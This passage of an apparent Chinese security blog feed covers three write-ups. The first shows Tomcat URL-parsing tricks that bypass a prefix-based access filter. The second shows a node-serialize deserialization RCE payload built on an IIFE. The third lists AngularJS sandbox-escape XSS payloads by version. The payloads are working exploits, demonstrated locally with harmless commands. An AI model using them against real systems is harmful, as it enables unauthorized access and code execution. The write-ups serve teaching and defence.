class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">"/urltest/info"</span>)) &#123;</span><br><span class="line">            httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。</p><p>编辑web.xml，添加testFilter设置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.testFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行之后，访问<code>http://localhost:8080/urltest/info/secret.jsp</code>，会显示无权限：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/17.png" alt=""></p><p>根据前面的分析构造如下几个payload都能成功绕过认证限制来访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/urltest/./info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/;mi1k7ea/info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/mi1k7ea/../info/secret.jsp</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/18.png" alt=""></p><p>整个的过程大致如此，就是利用解析的差异性来绕过认证。</p><p>在前段时间爆出的Apache Shiro的CVE中，就是使用getRequestURI()函数导致的，这里可以看到人家的补丁是怎么打的，其实就是用getPathInfo()替换掉就OK了：<a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://joychou.org/web/security-of-getRequestURI.html" target="_blank" rel="noopener">getRequestURI()带来的安全问题</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Tomcat" scheme="https://www.mi1k7ea.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>node-serialize反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/node-serialize反序列化漏洞/</id>
    <published>2020-03-29T15:05:59.000Z</published>
    <updated>2020-03-29T16:02:10.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Node.js在node-serialize模块中存在反序列化漏洞，若unserialize()函数参数外部可控，则通过IIFE（Immediately Invoked Function Expression）可以实现RCE。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>需要安装node-serialize模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install node-serialize</span><br></pre></td></tr></table></figure><h2 id="0x03-序列化"><a href="#0x03-序列化" class="headerlink" title="0x03 序列化"></a>0x03 序列化</h2><p>序列化代码如下，serialize.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure><p>变量y是一段payload，用于启动一个子线程来执行calc命令，这里输出序列化后的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;node serialize.js</span><br><span class="line">Serialized:</span><br><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-IIFE"><a href="#0x04-IIFE" class="headerlink" title="0x04 IIFE"></a>0x04 IIFE</h2><p>前面得到了序列化的字符串之后，就可以用unserialize()函数进行反序列化了。那么问题来了，怎么代码执行呢？这就用到了JavaScript的IIFE了。</p><p>IIFE（Immediately Invoked Function Expression）立即调用的函数表达式，即声明函数的同时立即调用该函数，目的是为了隔离作用域，防止污染全局命名空间。</p><p>IIFE一般有如下两种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code /* &#125;());</span><br><span class="line">(function()&#123; /* code /* &#125;)();</span><br></pre></td></tr></table></figure><p>有时，我们需要在定义函数之后，立即调用该函数。此时，你不能再函数的定义之后加上圆括号，这是因为会产生语法错误，错误原因是function这个关键字既可以当作语句，也可以当作表达式。为了避免其余，规定function关键字出现在行首时，解释为语句。因此，若是以function开头的代码则必须像前面一样的写法才能成功在定义时被当作表达式执行。</p><p>写下Demo试下，下面两种形式都能成功弹计算器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/node-serialize反序列化漏洞/1.png" alt=""></p><p>在前面序列化的代码serialize.js中，要想在序列化时直接执行该函数，可以将代码修改如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">poc : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/node-serialize反序列化漏洞/2.png" alt=""></p><h2 id="0x05-反序列化触发RCE"><a href="#0x05-反序列化触发RCE" class="headerlink" title="0x05 反序列化触发RCE"></a>0x05 反序列化触发RCE</h2><p>前面序列化得到如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>在此基础上，为了在服务端进行反序列化操作的时候能触发RCE，我们直接在函数定义的后面追加<code>()</code>来构造即可（为啥能这么构造后面会说到）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure><p>反序列化代码如下，unserialize.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"function":"_$$ND_FUNC$$_function()&#123;\\r\\n\\t\\trequire(\'child_process\').exec(\'calc\', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\r\\n\\t&#125;()"&#125;'</span></span><br><span class="line"></span><br><span class="line">s.unserialize(payload);</span><br></pre></td></tr></table></figure><p>运行即可触发RCE弹计算器：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/3.png" alt=""></p><h2 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h2><p>我们看源码，位于NodeJS\node_modules\node-serialize\lib\serialize.js，其中反序列化相关的代码如下：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/4.png" alt=""></p><p>这里当解析到将要反序列化的内容中的键值为string类型时，判断是否包含FUNCFLAG变量值即<code>_$$ND_FUNC$$_</code>，在前面的代码中有定义，该值表明其中的内容是个函数：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/5.png" alt=""></p><p>回到前面的if判断条件中往下走，若是则调用76行中的eval()方法来执行其中的语句。同时，由于JS的IIFE，使得刚刚定义的恶意函数就能够马上得以执行，从而RCE。</p><p>有个疑问，为啥这里不需要向前面IIFE小节中说的给function定义加<code>()</code>使其不是function开头呢？我们看到eval()那行代码：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/6.png" alt=""></p><p>明显看到，它已经给我们的整个的function给加上了括号括起来，我们只需要在函数定义后面加上<code>()</code>即可满足IIFE的其中一种格式，从而成功RCE。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.mi1k7ea.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>浅析AngularJS安全</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/%E6%B5%85%E6%9E%90AngularJS%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/浅析AngularJS安全/</id>
    <published>2020-03-29T04:36:28.000Z</published>
    <updated>2020-03-29T11:03:24.348Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01基本概念"><a href="#0x01基本概念" class="headerlink" title="0x01基本概念"></a>0x01基本概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>AngularJS是一个JavaScript框架，是以一个JavaScript文件形式发布的，可通过<code>&lt;script&gt;</code>标签添加到HTML页面（通过指令扩展了HTML，且通过表达式绑定数据到HTML）。</p><p>通过<code>&lt;script&gt;</code>标签引入AngularJS的JS文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.angularjs.org/1.4.0/angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>各个版本的angular.js下载： <a href="https://github.com/angular/angular.js/releases" target="_blank" rel="noopener">https://github.com/angular/angular.js/releases</a></p><p>在线版本：<a href="https://code.angularjs.org/" target="_blank" rel="noopener">https://code.angularjs.org/</a></p><p>AngularJS使得开发现代的单一页面应用程序（SPAs：Single Page Applications）变得更加容易。</p><ul><li>AngularJS把应用程序数据绑定到HTML元素。</li><li>AngularJS可以克隆和重复HTML元素。</li><li>AngularJS可以隐藏和显示HTML元素。</li><li>AngularJS可以在HTML元素”背后”添加代码。</li><li>AngularJS支持输入验证。</li></ul><h3 id="AngularJS指令"><a href="#AngularJS指令" class="headerlink" title="AngularJS指令"></a>AngularJS指令</h3><p>AngularJS通过被称为指令的新属性来扩展HTML，通过内置的指令来为应用添加功能，并且允许你自定义指令。</p><p>AngularJS指令是带有前缀<code>ng-</code>，几个常见指令如下：</p><ul><li>ng-app指令定义一个AngularJS应用程序。</li><li>ng-model指令把元素值（比如输入域的值）绑定到应用程序。</li><li>ng-bind指令把应用程序数据绑定到HTML视图。</li><li>ng-init指令初始化应用程序数据。</li></ul><h3 id="AngularJS表达式"><a href="#AngularJS表达式" class="headerlink" title="AngularJS表达式"></a>AngularJS表达式</h3><p>AngularJS使用表达式把数据绑定到HTML，其中AngularJS表达式是写在双大括号内的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; expression &#125;&#125;</span><br></pre></td></tr></table></figure><p>AngularJS表达式把数据绑定到HTML，这与ng-bind指令有异曲同工之妙。</p><p>AngularJS将在表达式书写的位置”输出”数据。</p><p><strong>与JavaScript表达式的异同点：</strong></p><ul><li>类似于JavaScript表达式，AngularJS表达式可以包含字母，操作符，变量。</li><li>与JavaScript表达式不同，AngularJS表达式可以写在HTML中。</li><li>与JavaScript表达式不同，AngularJS表达式不支持条件判断，循环及异常。</li><li>与JavaScript表达式不同，AngularJS表达式支持过滤器。</li></ul><h3 id="AngularJS应用"><a href="#AngularJS应用" class="headerlink" title="AngularJS应用"></a>AngularJS应用</h3><p>AngularJS模块（Module）定义了AngularJS应用。</p><p>AngularJS控制器（Controller）用于控制AngularJS应用。</p><p>ng-app指令指明了应用，ng-controller指明了控制器。</p><p>ng-app指令位于应用的根元素下。对于单页Web应用（single page web application，SPA），应用的根通常为html元素。</p><p>一个或多个ng-controller指令定义了应用的控制器。每个控制器有他自己的作用域：定义的HTML元素。</p><p>AngularJS在HTML DOMContentLoaded事件中自动开始。如果找到ng-app指令，AngularJS载入指令中的模块，并将ng-app作为应用的根进行编译。应用的根可以是整个页面，或者页面的一小部分，如果是一小部分会更快编译和执行。</p><h3 id="如何判断是否使用AngularJS"><a href="#如何判断是否使用AngularJS" class="headerlink" title="如何判断是否使用AngularJS"></a>如何判断是否使用AngularJS</h3><p>在当前页面F12打开Console，输入<code>angular.version</code>，若有返回版本信息则使用了：</p><p><img src="/2020/03/29/浅析AngularJS安全/3.png" alt=""></p><p>若未使用则会报错：</p><p><img src="/2020/03/29/浅析AngularJS安全/1.png" alt=""></p><h2 id="0x02-AngularJS沙箱逃逸"><a href="#0x02-AngularJS沙箱逃逸" class="headerlink" title="0x02 AngularJS沙箱逃逸"></a>0x02 AngularJS沙箱逃逸</h2><p>AngularJS是一个JavaScript框架，而针对JavaScript的Web攻击通常都是以XSS为主。</p><p>由于AngularJS沙箱的存在，使得在AngularJS框架下的字符都被自动转码。如果想执行XSS攻击，就需要绕过AngularJS沙箱，这里由于支持AngularJS表达式，因此存在表达式注入来绕过沙箱的风险。</p><p>对于可能存在XSS的地方，针对不同版本的angular需要输入不同的payload才能绕过沙箱执行XSS（一般需要确认输入字符未对<code>()&#39;</code>等特殊字符进行过滤）。</p><p>测试代码如下，angular-bypass.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$q = $_GET[&apos;q&apos;];</span><br><span class="line">echo htmlspecialchars($q,ENT_QUOTES);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>以下payload省略AngularJS表达式的标志符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>要验证输入点是否存在XSS，最简单的PoC为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2*3&#125;&#125;</span><br></pre></td></tr></table></figure><p>当响应页面包含”6”字符串时即可证明存在XSS，后面就是针对AngularJS沙箱的绕过。</p><p><img src="/2020/03/29/浅析AngularJS安全/2.png" alt=""></p><h3 id="lt-1-1-5-或-gt-1-6-0（无沙箱）"><a href="#lt-1-1-5-或-gt-1-6-0（无沙箱）" class="headerlink" title="&lt;=1.1.5 或 &gt;=1.6.0（无沙箱）"></a>&lt;=1.1.5 或 &gt;=1.6.0（无沙箱）</h3><p>在1.1.5版本以前是还未存在沙箱的，因此能直接触发。而由于不断被绕过沙箱，在1.6.0以后的版本，官方干脆将沙箱都给撤掉了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">constructor.constructor(&apos;alert(1)&apos;)()</span><br><span class="line">或</span><br><span class="line">[].pop.constructor(&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/4.png" alt=""></p><p><img src="/2020/03/29/浅析AngularJS安全/5.png" alt=""></p><h3 id="1-2-0-1-2-18"><a href="#1-2-0-1-2-18" class="headerlink" title="1.2.0 - 1.2.18"></a>1.2.0 - 1.2.18</h3><p>当然，下面这个payload在无沙箱的版本中也能成功执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/6.png" alt=""></p><h3 id="1-2-2-1-2-5"><a href="#1-2-2-1-2-5" class="headerlink" title="1.2.2 - 1.2.5"></a>1.2.2 - 1.2.5</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].charAt=&apos;&apos;.valueOf;$eval(&quot;x=&apos;&quot;+(y=&apos;if(!window\\u002ex)alert(window\\u002ex=1)&apos;)+eval(y)+&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><h3 id="1-2-1-1-2-18"><a href="#1-2-1-1-2-18" class="headerlink" title="1.2.1 - 1.2.18"></a>1.2.1 - 1.2.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(_=&apos;&apos;.sub).call.call(&#123;&#125;[$=&apos;constructor&apos;].getOwnPropertyDescriptor(_.__proto__,$).value,0,&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/7.png" alt=""></p><h3 id="1-2-19-1-2-23"><a href="#1-2-19-1-2-23" class="headerlink" title="1.2.19 - 1.2.23"></a>1.2.19 - 1.2.23</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/8.png" alt=""></p><h3 id="1-2-24-1-2-26"><a href="#1-2-24-1-2-26" class="headerlink" title="1.2.24 -1.2.26"></a>1.2.24 -1.2.26</h3><p>1.1.5以下版本的是ok的，但是和网上说的1.2.24 -1.2.26版本的测试却没有弹框。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;x&apos;]=constructor.getOwnPropertyDescriptor;</span><br><span class="line">g=&#123;&#125;[[&apos;__proto__&apos;]][&apos;x&apos;];</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;y&apos;]=g(&apos;&apos;.sub[[&apos;__proto__&apos;]],&apos;constructor&apos;);</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;z&apos;]=constructor.defineProperty;</span><br><span class="line">d=&#123;&#125;[[&apos;__proto__&apos;]][&apos;z&apos;];</span><br><span class="line">d(&apos;&apos;.sub[[&apos;__proto__&apos;]],&apos;constructor&apos;,&#123;value:false&#125;);</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;y&apos;].value(&apos;alert(1)&apos;)();</span><br></pre></td></tr></table></figure><h3 id="1-2-24-1-2-29"><a href="#1-2-24-1-2-29" class="headerlink" title="1.2.24 - 1.2.29"></a>1.2.24 - 1.2.29</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;.constructor.prototype.charAt=&apos;&apos;.valueOf;$eval(&quot;x=&apos;\&quot;+(y=&apos;if(!window\\u002ex)alert(window\\u002ex=1)&apos;)+eval(y)+\&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><h3 id="lt-1-2-5-或-1-2-20-1-3-20"><a href="#lt-1-2-5-或-1-2-20-1-3-20" class="headerlink" title="&lt;=1.2.5 或 1.2.20 - 1.3.20"></a>&lt;=1.2.5 或 1.2.20 - 1.3.20</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.&quot;)));alert(1)//&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/9.png" alt=""></p><h3 id="1-3-0-1-3-18"><a href="#1-3-0-1-3-18" class="headerlink" title="1.3.0 - 1.3.18"></a>1.3.0 - 1.3.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].assign=[].join;</span><br><span class="line">&apos;a&apos;.constructor.prototype.charAt=&apos;&apos;.valueOf;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/10.png" alt=""></p><h3 id="1-3-3-1-3-18"><a href="#1-3-3-1-3-18" class="headerlink" title="1.3.3 - 1.3.18"></a>1.3.3 - 1.3.18</h3><figure 